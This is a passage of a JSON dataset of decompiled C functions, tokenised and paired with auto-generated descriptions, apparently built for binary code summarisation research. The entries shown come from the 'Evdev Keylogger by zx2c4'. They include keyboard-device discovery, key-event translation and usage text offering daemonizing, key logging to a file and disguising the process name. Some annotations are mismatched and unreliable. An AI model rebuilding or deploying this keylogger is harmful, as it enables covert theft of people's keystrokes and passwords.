            ")",
            ";",
            "if",
            "(",
            "fd",
            "[",
            "9",
            "]",
            "!",
            "=",
            "-",
            "1",
            ")",
            "close",
            "(",
            "fd",
            "[",
            "9",
            "]",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "[",
            "10",
            "]",
            "!",
            "=",
            "-",
            "1",
            ")",
            "close",
            "(",
            "fd",
            "[",
            "10",
            "]",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "[",
            "11",
            "]",
            "!",
            "=",
            "-",
            "1",
            ")",
            "close",
            "(",
            "fd",
            "[",
            "11",
            "]",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "[",
            "12",
            "]",
            "!",
            "=",
            "-",
            "1",
            ")",
            "close",
            "(",
            "fd",
            "[",
            "12",
            "]",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "[",
            "13",
            "]",
            "!",
            "=",
            "-",
            "1",
            ")",
            "close",
            "(",
            "fd",
            "[",
            "13",
            "]",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "[",
            "14",
            "]",
            "!",
            "=",
            "-",
            "1",
            ")",
            "close",
            "(",
            "fd",
            "[",
            "14",
            "]",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "[",
            "15",
            "]",
            "!",
            "=",
            "-",
            "1",
            ")",
            "close",
            "(",
            "fd",
            "[",
            "15",
            "]",
            ")",
            ";",
            "LODWORD",
            "(",
            "v6",
            ")",
            "=",
            "1",
            ";",
            "}",
            "else",
            "{",
            "fwrite",
            "(",
            "\"Could not find default event device.\\nTry passing it manually with --event-device.\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x52uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "LODWORD",
            "(",
            "v6",
            ")",
            "=",
            "1",
            ";",
            "}",
            "}",
            "else",
            "{",
            "v5",
            "=",
            "v3",
            "-",
            "100",
            ";",
            "if",
            "(",
            "v5",
            "<",
            "=",
            "0x11u",
            ")",
            "__asm",
            "{",
            "jmp",
            "rax",
            "}",
            "v20",
            "=",
            "v4",
            ";",
            "fwrite",
            "(",
            "\"Evdev Keylogger by zx2c4\\n\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x1AuL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "__fprintf_chk",
            "(",
            "stderr",
            ",",
            "1L",
            "L",
            ",",
            "\"Usage: %s [OPTION]...\\n\"",
            ",",
            "*",
            "argv",
            ")",
            ";",
            "fwrite",
            "(",
            "\"  -d, --daemonize                     run as a background daemon\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x41uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "fwrite",
            "(",
            "\"  -f, --foreground                    run in the foreground (default)\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x46uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "fwrite",
            "(",
            "\"  -u, --force-us-keymap               instead of auto-detection, force usage of built-in US keymap\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x63uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "fwrite",
            "(",
            "\"  -e DEVICE, --event-device=DEVICE    use event device DEVICE (default=auto-detect)\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x54uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "fwrite",
            "(",
            "\"  -l FILE, --log-file=FILE            write key log to FILE (default=stdout)\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x4DuL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "fwrite",
            "(",
            "\"  -p FILE, --pid-file=FILE            write the pid of the process to FILE\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x4BuL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "fwrite",
            "(",
            "\"  -n NAME, --process-name=NAME        change process name in ps and top to NAME\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x50uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "fwrite",
            "(",
            "\"  -h, --help                          display this message\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x3BuL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "return",
            "v20",
            "!",
            "=",
            "104",
            ";",
            "}",
            "return",
            "v6",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"__read\" function appears to be used for reading data from various sources, such as device drivers or filesystems, by invoking specific read operations or system calls, and possibly interacting with shared libraries through weak symbol declarations.",
            "The function \"qword\" likely deals with handling 64-bit unsigned integers (quad-word) and could potentially include operations or manipulations specific to this data type.",
            "The function appears to be a part of a larger codebase that deals with handling and processing arrays of various data types and formats, likely in a context related to computational programming or data manipulation."
        ],
        "longer_label": "The provided code appears to be a C program implementing an event device keylogger, utilizing low-level system calls for device interaction and featuring options for daemonization, foreground operation, and custom keymap selection, while handling file descriptors and I/O operations."
    },
    {
        "id": 175,
        "docstring_tokens": [
            "The",
            "code",
            "reads",
            "from",
            "/proc/bus/input/devices",
            "to",
            "find",
            "default",
            "keyboard",
            "devices",
            "and",
            "stores",
            "them",
            "in",
            "event_device",
            "array",
            ",",
            "returning",
            "the",
            "number",
            "of",
            "devices",
            "found",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ")",
            "{",
            "unsigned",
            "int",
            "v1",
            ";",
            "FILE",
            "*",
            "v2",
            ";",
            "char",
            "*",
            "v3",
            ";",
            "char",
            "*",
            "v4",
            ";",
            "char",
            "v5",
            ";",
            "int",
            "v6",
            ";",
            "const",
            "unsigned",
            "__int16",
            "*",
            "v7",
            ";",
            "__int64",
            "v8",
            ";",
            "const",
            "char",
            "*",
            "v9",
            ";",
            "__int64",
            "s",
            ";",
            "int",
            "v13",
            ";",
            "__int16",
            "v14",
            ";",
            "char",
            "haystack",
            "[",
            "136",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v16",
            ";",
            "v1",
            "=",
            "0",
            ";",
            "v16",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v2",
            "=",
            "fopen",
            "(",
            "\"/proc/bus/input/devices\"",
            ",",
            "\"r\"",
            ")",
            ";",
            "if",
            "(",
            "v2",
            ")",
            "{",
            "while",
            "(",
            "fgets",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "s",
            ",",
            "128",
            ",",
            "v2",
            ")",
            ")",
            "{",
            "if",
            "(",
            "&",
            "s",
            "=",
            "=",
            "(",
            "__int64",
            "*",
            ")",
            "strstr",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "&",
            "s",
            ",",
            "\"H: Handlers=\"",
            ")",
            ")",
            "{",
            "__strcpy_chk",
            "(",
            "haystack",
            ",",
            "&",
            "s",
            ",",
            "128L",
            "L",
            ")",
            ";",
            "}",
            "else",
            "if",
            "(",
            "s",
            "=",
            "=",
            "0x32313D5645203A42L",
            "L",
            "&",
            "&",
            "v13",
            "=",
            "=",
            "858861616",
            "&",
            "&",
            "v14",
            "=",
            "=",
            "10",
            ")",
            "{",
            "v3",
            "=",
            "strstr",
            "(",
            "haystack",
            ",",
            "\"event\"",
            ")",
            ";",
            "v4",
            "=",
            "v3",
            ";",
            "if",
            "(",
            "v3",
            ")",
            "{",
            "v5",
            "=",
            "v3",
            "[",
            "5",
            "]",
            ";",
            "v6",
            "=",
            "0",
            ";",
            "if",
            "(",
            "v5",
            ")",
            "{",
            "v7",
            "=",
            "*",
            "__ctype_b_loc",
            "(",
            ")",
            ";",
            "v8",
            "=",
            "0L",
            "L",
            ";",
            "do",
            "{",
            "v6",
            "=",
            "v8",
            ";",
            "if",
            "(",
            "(",
            "v7",
            "[",
            "v5",
            "]",
            "&",
            "0x800",
            ")",
            "=",
            "=",
            "0",
            ")",
            "break",
            ";",
            "haystack",
            "[",
            "v8",
            "]",
            "=",
            "v5",
            ";",
            "v6",
            "=",
            "+",
            "+",
            "v8",
            ";",
            "v5",
            "=",
            "v4",
            "[",
            "v8",
            "+",
            "5",
            "]",
            ";",
            "}",
            "while",
            "(",
            "v5",
            ")",
            ";",
            "}",
            "v9",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "(",
            "(",
            "__int64",
            ")",
            "(",
            "int",
            ")",
            "v1",
            "<",
            "<",
            "8",
            ")",
            ")",
            ";",
            "haystack",
            "[",
            "v6",
            "]",
            "=",
            "0",
            ";",
            "__snprintf_chk",
            "(",
            "v9",
            ",",
            "256L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "-",
            "1L",
            "L",
            ",",
            "\"/dev/input/event%s\"",
            ",",
            "haystack",
            ")",
            ";",
            "+",
            "+",
            "v1",
            ";",
            "__fprintf_chk",
            "(",
            "stderr",
            ",",
            "1L",
            "L",
            ",",
            "\"listening to keyboard: %s\\n\"",
            ",",
            "v9",
            ")",
            ";",
            "if",
            "(",
            "v1",
            "=",
            "=",
            "16",
            ")",
            "break",
            ";",
            "}",
            "}",
            "}",
            "fclose",
            "(",
            "v2",
            ")",
            ";",
            "}",
            "else",
            "{",
            "perror",
            "(",
            "\"fopen\"",
            ")",
            ";",
            "}",
            "return",
            "v1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `strstr` function, when not available in the system's string library, is implemented through a series of preprocessor macros and possibly custom implementations, allowing for string searching functionality within a given string using a specified substring."
        ],
        "longer_label": "The provided code is a function written in C/C++ that searches for default keyboard devices in the Linux system's `/proc/bus/input/devices` file, utilizing custom implementations for string searching, and returns the count of found devices up to a maximum of 16."
    },
    {
        "id": 176,
        "docstring_tokens": [
            "The",
            "code",
            "translates",
            "input",
            "events",
            "to",
            "wchar_t",
            "characters",
            "based",
            "on",
            "key",
            "states",
            "and",
            "values",
            ",",
            "returning",
            "the",
            "length",
            "of",
            "the",
            "translated",
            "characters",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "char",
            "*",
            "a2",
            ",",
            "__int64",
            "a3",
            ",",
            "__int64",
            "a4",
            ")",
            "{",
            "bool",
            "v4",
            ";",
            "unsigned",
            "__int16",
            "v6",
            ";",
            "int",
            "v9",
            ";",
            "char",
            "v10",
            ";",
            "const",
            "char",
            "*",
            "v11",
            ";",
            "int",
            "v12",
            ";",
            "char",
            "v13",
            ";",
            "const",
            "char",
            "*",
            "v14",
            ";",
            "unsigned",
            "int",
            "v15",
            ";",
            "__int64",
            "v16",
            ";",
            "int",
            "v17",
            ";",
            "int",
            "v18",
            ";",
            "unsigned",
            "__int16",
            "v19",
            ";",
            "int",
            "v20",
            "[",
            "66",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v21",
            ";",
            "v21",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v4",
            "=",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            "=",
            "=",
            "1",
            ";",
            "v20",
            "[",
            "0",
            "]",
            "=",
            "0",
            ";",
            "if",
            "(",
            "!",
            "v4",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "v6",
            "=",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "18",
            ")",
            ";",
            "if",
            "(",
            "v6",
            ">",
            "0x80u",
            ")",
            "return",
            "(",
            "int",
            ")",
            "__swprintf_chk",
            "(",
            "a3",
            ",",
            "a4",
            ",",
            "1L",
            "L",
            ",",
            "0x3FFFFFFFFFFFFFFFL",
            "L",
            ",",
            "\"<\"",
            ")",
            ";",
            "v9",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "20",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v9",
            "-",
            "1",
            ")",
            "<",
            "=",
            "1",
            ")",
            "{",
            "if",
            "(",
            "v6",
            "!",
            "=",
            "42",
            "&",
            "&",
            "v6",
            "!",
            "=",
            "54",
            ")",
            "{",
            "switch",
            "(",
            "v6",
            ")",
            "{",
            "case",
            "0x64u",
            ":",
            "*",
            "a2",
            "|",
            "=",
            "1u",
            ";",
            "goto",
            "LABEL_28",
            ";",
            "case",
            "0x38u",
            ":",
            "*",
            "a2",
            "|",
            "=",
            "2u",
            ";",
            "goto",
            "LABEL_28",
            ";",
            "case",
            "0x1Du",
            ":",
            "case",
            "0x61u",
            ":",
            "*",
            "a2",
            "|",
            "=",
            "8u",
            ";",
            "goto",
            "LABEL_28",
            ";",
            "}",
            "if",
            "(",
            "(",
            "unsigned",
            "__int16",
            ")",
            "(",
            "v6",
            "-",
            "125",
            ")",
            "<",
            "=",
            "1u",
            ")",
            "{",
            "*",
            "a2",
            "|",
            "=",
            "0x10u",
            ";",
            "goto",
            "LABEL_28",
            ";",
            "}",
            "v10",
            "=",
            "*",
            "a2",
            ";",
            "v11",
            "=",
            "\"<\"",
            ";",
            "if",
            "(",
            "(",
            "*",
            "a2",
            "&",
            "0x1A",
            ")",
            "!",
            "=",
            "26",
            ")",
            "{",
            "v11",
            "=",
            "\"<\"",
            ";",
            "if",
            "(",
            "(",
            "v10",
            "&",
            "0xA",
            ")",
            "!",
            "=",
            "10",
            ")",
            "{",
            "v11",
            "=",
            "\"<\"",
            ";",
            "if",
            "(",
            "(",
            "v10",
            "&",
            "0x12",
            ")",
            "!",
            "=",
            "18",
            ")",
            "{",
            "v11",
            "=",
            "\"<\"",
            ";",
            "if",
            "(",
            "(",
            "v10",
            "&",
            "0x18",
            ")",
            "!",
            "=",
            "24",
            ")",
            "{",
            "v11",
            "=",
            "\"<\"",
            ";",
            "if",
            "(",
            "(",
            "v10",
            "&",
            "0x10",
            ")",
            "=",
            "=",
            "0",
            ")",
            "{",
            "v11",
            "=",
            "\"<\"",
            ";",
            "if",
            "(",
            "(",
            "v10",
            "&",
            "8",
            ")",
            "=",
            "=",
            "0",
            ")",
            "{",
            "if",
            "(",
            "(",
            "v10",
            "&",
            "2",
            ")",
            "=",
            "=",
            "0",
            ")",
            "{",
            "LABEL_28",
            ":",
            "v12",
            "=",
            "v6",
            ";",
            "goto",
            "LABEL_29",
            ";",
            "}",
            "v11",
            "=",
            "\"<\"",
            ";",
            "}",
            "}",
            "}",
            "}",
            "}",
            "}",
            "__swprintf_chk",
            "(",
            "v20",
            ",",
            "64L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "64L",
            "L",
            ",",
            "v11",
            ")",
            ";",
            "v19",
            "=",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "18",
            ")",
            ";",
            "v12",
            "=",
            "v19",
            ";",
            "if",
            "(",
            "v19",
            ">",
            "0x80u",
            ")",
            "__assert_fail",
            "(",
            "\"code < sizeof(char_or_func)\"",
            ",",
            "\"keymap.c\"",
            ",",
            "0x4Cu",
            ",",
            "\"is_char_key\"",
            ")",
            ";",
            "LABEL_29",
            ":",
            "v13",
            "=",
            "char_or_func",
            "[",
            "v12",
            "]",
            ";",
            "if",
            "(",
            "v13",
            "!",
            "=",
            "99",
            ")",
            "{",
            "if",
            "(",
            "v13",
            "=",
            "=",
            "70",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "20",
            ")",
            "!",
            "=",
            "1",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "if",
            "(",
            "v13",
            "!",
            "=",
            "102",
            ")",
            "{",
            "v14",
            "=",
            "\"%\"",
            ";",
            "return",
            "(",
            "int",
            ")",
            "__swprintf_chk",
            "(",
            "a3",
            ",",
            "a4",
            ",",
            "1L",
            "L",
            ",",
            "0x3FFFFFFFFFFFFFFFL",
            "L",
            ",",
            "v14",
            ")",
            ";",
            "}",
            "v14",
            "=",
            "\"%\"",
            ";",
            "return",
            "(",
            "int",
            ")",
            "__swprintf_chk",
            "(",
            "a3",
            ",",
            "a4",
            ",",
            "1L",
            "L",
            ",",
            "0x3FFFFFFFFFFFFFFFL",
            "L",
            ",",
            "v14",
            ")",
            ";",
            "}",
            "v15",
            "=",
            "v12",
            "-",
            "2",
            ";",
            "if",
            "(",
            "(",
            "*",
            "a2",
            "&",
            "1",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "if",
            "(",
            "v15",
            "<",
            "=",
            "0xB",
            ")",
            "{",
            "LODWORD",
            "(",
            "v16",
            ")",
            "=",
            "v12",
            "-",
            "2",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v12",
            "-",
            "16",
            ")",
            "<",
            "=",
            "0xB",
            ")",
            "{",
            "LODWORD",
            "(",
            "v16",
            ")",
            "=",
            "v12",
            "-",
            "4",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v12",
            "-",
            "30",
            ")",
            "<",
            "=",
            "0xB",
            ")",
            "{",
            "LODWORD",
            "(",
            "v16",
            ")",
            "=",
            "v12",
            "-",
            "6",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v12",
            "-",
            "43",
            ")",
            "<",
            "=",
            "0xA",
            ")",
            "{",
            "LODWORD",
            "(",
            "v16",
            ")",
            "=",
            "v12",
            "-",
            "7",
            ";",
            "}",
            "else",
            "{",
            "v4",
            "=",
            "v12",
            "=",
            "=",
            "86",
            ";",
            "LODWORD",
            "(",
            "v16",
            ")",
            "=",
            "-",
            "1",
            ";",
            "if",
            "(",
            "v4",
            ")",
            "LODWORD",
            "(",
            "v16",
            ")",
            "=",
            "47",
            ";",
            "}",
            "v16",
            "=",
            "(",
            "int",
            ")",
            "v16",
            ";",
            "v17",
            "=",
            "altgr_keys",
            "[",
            "(",
            "int",
            ")",
            "v16",
            "]",
            ";",
            "if",
            "(",
            "!",
            "v17",
            ")",
            "{",
            "if",
            "(",
            "(",
            "*",
            "a2",
            "&",
            "4",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "v18",
            "=",
            "shift_keys",
            "[",
            "(",
            "int",
            ")",
            "v16",
            "]",
            ";",
            "goto",
            "LABEL_47",
            ";",
            "}",
            "goto",
            "LABEL_60",
            ";",
            "}",
            "}",
            "else",
            "{",
            "if",
            "(",
            "(",
            "*",
            "a2",
            "&",
            "4",
            ")",
            "=",
            "=",
            "0",
            ")",
            "{",
            "if",
            "(",
            "v15",
            "<",
            "=",
            "0xB",
            ")",
            "{",
            "v16",
            "=",
            "(",
            "int",
            ")",
            "v15",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v12",
            "-",
            "16",
            ")",
            "<",
            "=",
            "0xB",
            ")",
            "{",
            "v16",
            "=",
            "v12",
            "-",
            "4",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v12",
            "-",
            "30",
            ")",
            "<",
            "=",
            "0xB",
            ")",
            "{",
            "v16",
            "=",
            "v12",
            "-",
            "6",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v12",
            "-",
            "43",
            ")",
            "<",
            "=",
            "0xA",
            ")",
            "{",
            "v16",
            "=",
            "v12",
            "-",
            "7",
            ";",
            "}",
            "else",
            "{",
            "v4",
            "=",
            "v12",
            "=",
            "=",
            "86",
            ";",
            "LODWORD",
            "(",
            "v16",
            ")",
            "=",
            "-",
            "1",
            ";",
            "if",
            "(",
            "v4",
            ")",
            "LODWORD",
            "(",
            "v16",
            ")",
            "=",
            "47",
            ";",
            "v16",
            "=",
            "(",
            "int",
            ")",
            "v16",
            ";",
            "}",
            "goto",
            "LABEL_60",
            ";",
            "}",
            "if",
            "(",
            "v15",
            "<",
            "=",
            "0xB",
            ")",
            "{",
            "LODWORD",
            "(",
            "v16",
            ")",
            "=",
            "v12",
            "-",
            "2",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v12",
            "-",
            "16",
            ")",
            "<",
            "=",
            "0xB",
            ")",
            "{",
            "LODWORD",
            "(",
            "v16",
            ")",
            "=",
            "v12",
            "-",
            "4",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v12",
            "-",
            "30",
            ")",
            "<",
            "=",
            "0xB",
            ")",
            "{",
            "LODWORD",
            "(",
            "v16",
            ")",
            "=",
            "v12",
            "-",
            "6",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v12",
            "-",
            "43",
            ")",
            "<",
            "=",
            "0xA",
            ")",
            "{",
            "LODWORD",
            "(",
            "v16",
            ")",
            "=",
            "v12",
            "-",
            "7",
            ";",
            "}",
            "else",
            "{",
            "v4",
            "=",
            "v12",
            "=",
            "=",
            "86",
            ";",
            "LODWORD",
            "(",
            "v16",
            ")",
            "=",
            "-",
            "1",
            ";",
            "if",
            "(",
            "v4",
            ")",
            "LODWORD",
            "(",
            "v16",
            ")",
            "=",
            "47",
            ";",
            "}",
            "v16",
            "=",
            "(",
            "int",
            ")",
            "v16",
            ";",
            "v17",
            "=",
            "shift_keys",
            "[",
            "(",
            "int",
            ")",
            "v16",
            "]",
            ";",
            "if",
            "(",
            "!",
            "v17",
            ")",
            "{",
            "LABEL_60",
            ":",
            "v18",
            "=",
            "char_keys",
            "[",
            "v16",
            "]",
            ";",
            "LABEL_47",
            ":",
            "if",
            "(",
            "v18",
            "!",
            "=",
            "60",
            ")",
            "{",
            "if",
            "(",
            "!",
            "v18",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "goto",
            "LABEL_49",
            ";",
            "}",
            "return",
            "(",
            "int",
            ")",
            "__swprintf_chk",
            "(",
            "a3",
            ",",
            "a4",
            ",",
            "1L",
            "L",
            ",",
            "0x3FFFFFFFFFFFFFFFL",
            "L",
            ",",
            "\"%\"",
            ")",
            ";",
            "}",
            "}",
            "if",
            "(",
            "v17",
            "!",
            "=",
            "60",
            ")",
            "{",
            "LABEL_49",
            ":",
            "v14",
            "=",
            "\"%\"",
            ";",
            "return",
            "(",
            "int",
            ")",
            "__swprintf_chk",
            "(",
            "a3",
            ",",
            "a4",
            ",",
            "1L",
            "L",
            ",",
            "0x3FFFFFFFFFFFFFFFL",
            "L",
            ",",
            "v14",
            ")",
            ";",
            "}",
            "return",
            "(",
            "int",
            ")",
            "__swprintf_chk",
            "(",
            "a3",
            ",",
            "a4",
            ",",
            "1L",
            "L",
            ",",
            "0x3FFFFFFFFFFFFFFFL",
            "L",
            ",",
            "\"%\"",
            ")",
            ";",
            "}",
            "*",
            "a2",
            "|",
            "=",
            "4u",
            ";",
            "goto",
            "LABEL_28",
            ";",
            "}",
            "if",
            "(",
            "v9",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "if",
            "(",
            "v6",
            "=",
            "=",
            "42",
            "|",
            "|",
            "v6",
            "=",
            "=",
            "54",
            ")",
            "{",
            "*",
            "a2",
            "&",
            "=",
            "~",
            "4u",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "if",
            "(",
            "v6",
            "=",
            "=",
            "100",
            ")",
            "{",
            "*",
            "a2",
            "&",
            "=",
            "~",
            "1u",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "v6",
            "!",
            "=",
            "56",
            ")",
            "{",
            "if",
            "(",
            "v6",
            "=",
            "=",
            "29",
            "|",
            "|",
            "v6",
            "=",
            "=",
            "97",
            ")",
            "{",
            "*",
            "a2",
            "&",
            "=",
            "~",
            "8u",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "__int16",
            ")",
            "(",
            "v6",
            "-",
            "125",
            ")",
            "<",
            "=",
            "1u",
            ")",
            "{",
            "*",
            "a2",
            "&",
            "=",
            "~",
            "0x10u",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "*",
            "a2",
            "&",
            "=",
            "~",
            "2u",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `__readfsqword` function is used to read an unsigned 64-bit integer (quadword) from the FS segment register on x86 architectures, primarily for low-level system programming or accessing thread information stored in the Thread Information Block (TIB) on Windows systems.",
            "The `printf` function in the provided code snippets is part of an implementation of a Reverse Polish Notation (RPN) calculator, facilitating formatted output and defined with additional macros and type definitions."
        ],
        "longer_label": "The code is a function for translating keyboard events, utilizing low-level system programming functions such as `__readfsqword` and `__swprintf_chk`, as well as macros and type definitions for formatted output."
    },
    {
        "id": 177,
        "docstring_tokens": [
            "This",
            "code",
            "translates",
            "an",
            "input",
            "event",
            "into",
            "a",
            "wide",
            "character",
            "buffer",
            ",",
            "then",
            "converts",
            "it",
            "to",
            "a",
            "multi-byte",
            "character",
            "buffer",
            "if",
            "the",
            "translation",
            "was",
            "successful",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "char",
            "*",
            "a2",
            ",",
            "char",
            "*",
            "a3",
            ",",
            "size_t",
            "a4",
            ")",
            "{",
            "bool",
            "v6",
            ";",
            "__int64",
            "v7",
            ";",
            "unsigned",
            "__int16",
            "v9",
            ";",
            "__int64",
            "v10",
            ";",
            "int",
            "v11",
            ";",
            "char",
            "v12",
            ";",
            "int",
            "v13",
            ";",
            "char",
            "v14",
            ";",
            "const",
            "char",
            "*",
            "v15",
            ";",
            "__int64",
            "v16",
            ";",
            "int",
            "v17",
            ";",
            "int",
            "v18",
            ";",
            "int",
            "v19",
            ";",
            "int",
            "v20",
            ";",
            "const",
            "char",
            "*",
            "v21",
            ";",
            "unsigned",
            "__int16",
            "v22",
            ";",
            "int",
            "v23",
            "[",
            "62",
            "]",
            ";",
            "__int64",
            "v24",
            ";",
            "int",
            "*",
            "v25",
            ";",
            "unsigned",
            "__int64",
            "v26",
            ";",
            "v26",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v6",
            "=",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            "=",
            "=",
            "1",
            ";",
            "v23",
            "[",
            "0",
            "]",
            "=",
            "0",
            ";",
            "if",
            "(",
            "!",
            "v6",
            ")",
            "goto",
            "LABEL_2",
            ";",
            "v9",
            "=",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "18",
            ")",
            ";",
            "v10",
            "=",
            "a4",
            ">",
            ">",
            "2",
            ";",
            "if",
            "(",
            "v9",
            ">",
            "0x80u",
            ")",
            "{",
            "v7",
            "=",
            "(",
            "int",
            ")",
            "__swprintf_chk",
            "(",
            "a3",
            ",",
            "a4",
            ">",
            ">",
            "2",
            ",",
            "1L",
            "L",
            ",",
            "0x3FFFFFFFFFFFFFFFL",
            "L",
            ",",
            "\"<\"",
            ")",
            ";",
            "goto",
            "LABEL_36",
            ";",
            "}",
            "v11",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "20",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v11",
            "-",
            "1",
            ")",
            ">",
            "1",
            ")",
            "{",
            "if",
            "(",
            "!",
            "v11",
            ")",
            "{",
            "switch",
            "(",
            "v9",
            ")",
            "{",
            "case",
            "0x2Au",
            ":",
            "case",
            "0x36u",
            ":",
            "*",
            "a2",
            "&",
            "=",
            "~",
            "4u",
            ";",
            "break",
            ";",
            "case",
            "0x64u",
            ":",
            "*",
            "a2",
            "&",
            "=",
            "~",
            "1u",
            ";",
            "break",
            ";",
            "case",
            "0x38u",
            ":",
            "*",
            "a2",
            "&",
            "=",
            "~",
            "2u",
            ";",
            "break",
            ";",
            "case",
            "0x1Du",
            ":",
            "case",
            "0x61u",
            ":",
            "*",
            "a2",
            "&",
            "=",
            "~",
            "8u",
            ";",
            "break",
            ";",
            "default",
            ":",
            "if",
            "(",
            "(",
            "unsigned",
            "__int16",
            ")",
            "(",
            "v9",
            "-",
            "125",
            ")",
            "<",
            "=",
            "1u",
            ")",
            "*",
            "a2",
            "&",
            "=",
            "~",
            "0x10u",
            ";",
            "break",
            ";",
            "}",
            "}",
            "goto",
            "LABEL_2",
            ";",
            "}",
            "switch",
            "(",
            "v9",
            ")",
            "{",
            "case",
            "0x2Au",
            ":",
            "case",
            "0x36u",
            ":",
            "*",
            "a2",
            "|",
            "=",
            "4u",
            ";",
            "goto",
            "LABEL_29",
            ";",
            "case",
            "0x64u",
            ":",
            "*",
            "a2",
            "|",
            "=",
            "1u",
            ";",
            "goto",
            "LABEL_29",
            ";",
            "case",
            "0x38u",
            ":",
            "*",
            "a2",
            "|",
            "=",
            "2u",
            ";",
            "goto",
            "LABEL_29",
            ";",
            "case",
            "0x1Du",
            ":",
            "case",
            "0x61u",
            ":",
            "*",
            "a2",
            "|",
            "=",
            "8u",
            ";",
            "goto",
            "LABEL_29",
            ";",
            "}",
            "if",
            "(",
            "(",
            "unsigned",
            "__int16",
            ")",
            "(",
            "v9",
            "-",
            "125",
            ")",
            "<",
            "=",
            "1u",
            ")",
            "{",
            "*",
            "a2",
            "|",
            "=",
            "0x10u",
            ";",
            "goto",
            "LABEL_29",
